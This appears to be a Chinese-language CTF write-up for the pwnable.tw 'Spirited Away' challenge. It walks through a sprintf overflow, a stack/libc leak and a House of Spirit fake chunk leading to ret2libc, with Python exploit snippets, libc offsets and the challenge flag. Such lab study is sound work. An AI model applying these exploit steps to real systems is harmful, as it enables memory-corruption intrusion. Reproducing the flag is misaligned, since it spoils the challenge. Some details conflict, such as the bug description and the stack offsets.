---
tags:
  - house-of-spirit
  - stack-buffer-overflow
  - ret2libc
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "长度字段的 off-by-one 可在栈上伪造 chunk 头，经 free() 触发 House of Spirit，从而覆盖返回地址。"
proof-of-concept: no
---

# Spirited Away — pwnable.tw（300 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10204`
>
> Flag：`FLAG{Gue55_the_answer_isn't_always_Y3S}`

## 题目概况

一个 32 位的电影评论问卷程序（i386，无 PIE、Partial RELRO、NX、栈 canary），链接 glibc 2.23。程序在循环里依次询问姓名、年龄、原因（reason）和评论（comment），每轮结束后可以再留一条评论。全局计数器记录评论总数。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## 程序逻辑（伪代码）

```c
void survey() {
    char sprintf_buf[0x38];     // ebp-0xe8
    uint32_t name_comment_len;  // ebp-0xb0, initialized to 0x3c (60)
    uint32_t reason_len;        // ebp-0xac, initialized to 0x50 (80)
    char reason[0x50];          // ebp-0xa8 .. ebp-0x58
    char comment[0x3c];         // ebp-0x58 .. ebp-0x1c (approx)
    char *name_ptr;             // ebp-0x54 (malloc'd heap pointer)

    name_comment_len = 0x3c;
    reason_len = 0x50;

    while (1) {
        name_ptr = malloc(0x3c);
        read(0, name_ptr, name_comment_len);     // name
        scanf("%d", &age);                         // age
        read(0, reason, reason_len);               // reason
        read(0, comment_buf, name_comment_len);    // comment (reuses name_comment_len!)

        printf("Name: %s\nReason: %s\n...", name_ptr, reason);

        // BUG: sprintf can overflow into name_comment_len
        sprintf(sprintf_buf, "%d comment so far. We will review ...", ++cnt);

        free(name_ptr);

        read(0, &choice, 1);
        if (choice == 'n') return;  // returns to main → exit
    }
}
```

## 漏洞

### V1 — `sprintf` 溢出破坏 `name_comment_len`（主要，可 Exploit）

**根因：** `sprintf_buf` 位于 `ebp-0xe8`、约 56 字节，而 `name_comment_len` 变量在 `ebp-0xb0`。sprintf 的格式串 `"%d comment so far. We will review them as soon as we can"` 有 57 个以上字符。当 `cnt` 从 1 位数变成 2 位数（count=10）时，结尾的 NUL 溢出到 `name_comment_len`，把它设成 **0**。当 `cnt` 到 3 位数（count=100）时，末尾的 `"...can\0"` 会把 `'n' = 0x6e`（110）写进 `name_comment_len`。

```text
sprintf_buf layout (cnt=100):
  ebp-0xe8: "100 comment so far. We will review them as soon as we can\0"
                                                                    ^
                                                          ebp-0xb0 = 0x6e ('n')
```

**第一阶段（cnt 10–99）：** `name_comment_len = 0` → 姓名和评论的 `read()` 调用读 0 字节（相当于被跳过）。年龄和 reason 仍正常工作。

**第二阶段（cnt ≥ 100）：** `name_comment_len = 0x6e`（110）→ 姓名和评论的读取长度比原来的 0x3c（60）**大得多**。评论缓冲区到栈上的 `name_ptr` 变量只有约 60 字节 → **评论读取会溢出覆盖 `name_ptr`**。

**影响：** 攻击者控制了会被 `free()` 的 `name_ptr`（堆指针），而下一轮它又会被 `malloc()` 出来。由此可以做 **House of Spirit**：让 `name_ptr` 指向栈上的假 fastbin chunk，释放它，接下来 malloc 就返回栈指针 —— 下一次读姓名便直接写到栈上。

### V2 — `printf("%s", reason)` 泄漏栈/libc（可 Exploit）

**根因：** `ebp-0xa8` 的 `reason` 缓冲区用 `read(0, reason, 0x50)` 读取，从不补 NUL。`printf("Reason: %s", reason)` 会越过这 0x50 字节，把栈上后面的内容一并打印。

```text
Stack layout after reason buffer:
  ebp-0xa8: reason[0x50]
  ebp-0x58: ... (comment area / other locals)
  ...
  ebp+0x00: saved_ebp          ← leaked (stack address)
  ebp+0x04: saved_eip = 0x08048908  ← leaked (return into main, constant)
  ebp+0x08: stdout FILE*       ← leaked (libc address)
```

**影响：** 用恰好 0x50 字节（不含换行）填满 reason，`%s` 就会泄漏：
- **`saved_ebp`** → 栈地址（用于计算假 chunk 的目标位置）
- **`0x08048908`** → 锚点值（survey 返回 main 的地址，用于确认对齐）
- **`stdout`（`_IO_2_1_stdout_`）** → libc 地址（减去已知偏移 → libc 基址）

有些解题者用更少的字节填充 reason（例如 56 字节，只借 `_IO_file_sync`/`fflush` 的残留泄漏 libc 指针），从而得到更短的泄漏，具体取决于栈布局。

### V3 — 栈上的堆指针 → House of Spirit（助攻）

`ebp-0x54` 的 `name_ptr` 变量持有 `malloc` 得到的指针，每轮结束时 `free()`、下一轮开头重新 `malloc()`。由于 V1 能借评论溢出改写 `name_ptr`，我们可以：

1. 把 `name_ptr` 指向事先放在栈上 `reason` 缓冲区里的**假 fastbin chunk**
2. 随后的 `free(name_ptr)` 把这个假 chunk 塞进 0x40 的 fastbin
3. 下一次 `malloc(0x3c)` 返回该栈地址
4. 下一次 `read(0, name_ptr, 0x6e)` 从该假 chunk 起最多写 110 字节 → 覆盖 `saved_eip`

## 利用流程（所有解法通用）

每份解法都是同一条基本链，差别很小（泄漏偏移、padding、one_gadget 还是 ret2libc）。

### 第 1 步 —— 泄漏栈 + libc（第 1 轮）

用 0x50 字节（或更短的标记 + padding）填满 `reason`，从 `%s` 的回显里取出 `saved_ebp`（栈）和 `_IO_2_1_stdout_`（libc）。

```python
# Fill reason fully → leak stack and libc
send_name("A")
send_age("1\n")
send_reason("A" * 0x50)      # no NUL terminator
send_comment("C")
# parse: saved_ebp, return_addr (0x08048908), stdout pointer
```

### 第 2 步 —— 溢出 `name_comment_len`（第 2–100 轮）

再发 99 条评论，把 `cnt` 从 1 推到 100：
- 第 2–10 轮：正常（len=0x3c），四个字段都发
- 第 11–100 轮：len=0（被 NUL 覆盖），姓名和评论的读取被跳过；只发 age + reason + choice

```python
for i in range(2, 11):
    send_all_fields("a", "1\n", "x", "c"); send_choice("y")
for i in range(11, 101):
    # len=0: name/comment reads consume nothing
    send_age("1\n"); send_reason("x"); send_choice("y")
# cnt is now 100 → name_comment_len = 0x6e
```

### 第 3 步 —— 伪造 chunk + 重定向 `name_ptr`（第 101 轮）

在 `reason` 缓冲区里放一个假的 0x40 fastbin chunk，并用被放大的评论读取溢出 `name_ptr`：

```python
# Fake chunk in reason buffer (ebp-0xa8):
#   prev_size=0, size=0x41, data[0x38], next_size=0x41
reason = p32(0) + p32(0x41) + "X"*0x38 + p32(0) + p32(0x41)

# Overflow comment → overwrite name_ptr with address of fake chunk
comment = "Q"*0x54 + p32(fake_chunk_addr)

# Send and answer "y" → free(name_ptr) pushes fake chunk to fastbin
```

### 第 4 步 —— 写栈 → ret2libc / one_gadget（第 102 轮）

`malloc(0x3c)` 返回栈上的假 chunk。此时姓名 `read()` 会从假 chunk 起往栈上写 0x6e 字节，一直写到 `saved_eip`：

```python
# Overwrite saved_eip with system() and "/bin/sh" argument:
name = "A"*0x4c + p32(system) + p32(junk) + p32(binsh_addr)
send_name(name)
# ... fill remaining fields ...
send_choice("n")  # survey() returns → system("/bin/sh")
```

### 其他收尾方式

| 技巧 | 说明 | 使用者 |
|-----------|-------------|---------|
| `ret2libc: system("/bin/sh")` | 经典 32 位 ret2libc，`/bin/sh` 串取自 libc | 多数解法 |
| `one_gadget` | 把单个 gadget（如 `0x3a819`、`0x5f065`）写进 saved_eip | 1006、1727、7905 |
| `ROP → read() → puts(GOT) → system()` | 多段 ROP，运行时泄漏 libc 并迁移 | 1913 |
| 栈上 `"/bin/sh"` | 把 `/bin/sh` 串放栈上，让 `system` 参数指向它 | 17048 |

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|-----------|--------|-------------|
| libc 泄漏（`_IO_2_1_stdout_`） | V2：`printf("%s", reason)` 未补 NUL | 确定性 |
| 栈泄漏（`saved_ebp`） | V2：同一个 `%s` 泄漏 | 确定性 |
| 破坏 `name_comment_len`（0→0x6e） | V1：cnt=100 时 `sprintf` 溢出 | 确定性 |
| 覆盖 `name_ptr` | V1 带来的评论溢出 | 确定性 |
| 假 fastbin chunk（House of Spirit） | V3：在 reason 缓冲区伪造 chunk | 确定性 |
| 写栈（覆盖 saved_eip） | malloc 返回栈地址；姓名读取覆盖返回地址 | 确定性 |

## 关键栈布局

```text
ebp-0xe8: sprintf_buf[0x38]       ← "%d comment so far..."
ebp-0xb0: name_comment_len        ← overwritten by sprintf NUL/tail
ebp-0xac: reason_len (0x50)
ebp-0xa8: reason[0x50]            ← fake chunk placed here
ebp-0x58: comment/name_ptr area
ebp-0x54: name_ptr (heap)         ← overwritten via comment overflow
  ...
ebp+0x00: saved_ebp               ← leaked via V2
ebp+0x04: saved_eip (0x08048908)  ← overwritten to system() / one_gadget
ebp+0x08: stdout FILE*            ← leaked via V2 (libc anchor)
```

## 偏移（pwnable.tw `libc_32.so.6`，glibc 2.23）

```python
_IO_2_1_stdout_ = 0x1b0d60
system          = 0x3a940
bin_sh          = 0x158e8b
# one_gadgets (from one_gadget tool):
one_gadgets     = [0x3a819, 0x3a81c, 0x5f065, 0x5f066]
```

## 题解文章

| 文件 | 关键技术 | 备注 |
|------|---------------|-------|
| `1006.md` | sprintf 溢出 → House of Spirit → one_gadget | 经 reason 溢出泄漏栈；从 GOT 读 libc |
| `1172.md` | sprintf 溢出 → 假 chunk → system("/bin/sh") | 代码干净；一轮内完成泄漏 |
| `1269.md` | sprintf 溢出 → House of Spirit → one_gadget | 辅助函数详细；两阶段泄漏 |
| `1297.md` | sprintf 溢出 → 假 chunk → system+exit+binsh | 完整 ret2libc，收尾干净 |
| `1303.md` | sprintf 溢出 → 假 chunk → system | 解析写得乱但可用；原始十六进制泄漏 |
| `1316.md` | sprintf 溢出 → House of Spirit → system+exit+binsh | 干净的 exploit，recv 处理得当 |
| `1351.md` | sprintf 溢出 → 假 chunk → system | 用 ntpwn 库 |
| `1384.md` | sprintf 溢出 → 假 chunk → system | 极简；用 fflush 偏移泄漏 libc |
| `1689.md` | sprintf 溢出 → 假 chunk → system | 用 reason 的不同偏移做两段泄漏 |
| `1727.md` | sprintf 溢出 → House of Spirit → one_gadget（0x5f065） | 啰嗦但结构清晰 |
| `1803.md` | sprintf 溢出 → 假 chunk → system | 用 Ruby 写的 |
| `1913.md` | sprintf 溢出 → ROP 链（read→puts→system） | 多段 ROP；运行时经 puts(GOT) 泄漏 libc |
| `10128.md` | sprintf 溢出 → 假 chunk → system | 用正则解析泄漏 |
| `10840.md` | sprintf 溢出 → 假 chunk → system | 详细，含 fastbin next-size 校验 |
| `11445.md` | sprintf 溢出 → 假 chunk → system | 简短；以 `_IO_file_sync` 偏移锚定 libc |
| `11540.md` | sprintf 溢出 → 假 chunk → system | 用 `interactive()` 技巧处理 scanf 缓冲 |
| `13019.md` | sprintf 溢出 → House of Spirit → system | 分步详细，用 raw_input 暂停 |
| `14032.md` | sprintf 溢出 → 假 chunk → system | 用的是另一个 libc 版本（本地 2.27） |
| `14605.md` | sprintf 溢出 → 假 chunk → system | 辅助函数干净 |
| `17048.md` | sprintf 溢出 → House of Spirit → system | 详细，基于 telnetlib；把 "/bin/sh" 放栈上 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用 exploit（基于 socket，不用 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/spirited_away` | 题目二进制（i386，stripped） |
| `artifacts/libc_32.so.6` | 远端 libc（glibc 2.23，32 位） |
| `solution/*.md` | 社区 writeup（129 份解法） |
